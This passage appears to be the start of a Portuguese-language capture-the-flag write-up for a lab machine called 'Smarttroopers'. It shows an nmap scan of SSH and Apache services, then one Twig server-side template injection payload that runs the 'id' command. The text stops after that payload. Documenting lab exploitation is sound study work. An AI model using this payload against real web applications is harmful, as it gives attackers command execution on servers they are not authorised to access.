---
title: Smarttroopers
category: EHPT
---

## Enumeração

- Nmap

```plaintext
zurc@kali:/dcruz/ehpt/smarttroopers/scan$ nmap -p22,80 -A -Pn -oA full 192.168.56.70
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-29 19:39 -03
Nmap scan report for 192.168.56.70
Host is up (0.0070s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 0d:69:68:b2:2b:22:45:48:a0:33:4b:f8:b6:df:98:b1 (DSA)
|   2048 15:a3:20:0c:bf:6e:a8:fc:bb:de:66:c7:10:d4:1e:83 (RSA)
|   256 42:80:7a:74:c6:1a:47:8d:51:75:17:9b:f5:53:87:08 (ECDSA)
|_  256 60:e7:62:fa:01:87:cd:58:f5:d3:4b:d0:5e:76:5c:19 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: CHALL
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.78 seconds

```

### 80/TCP

- Analisando o site, vemos

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```
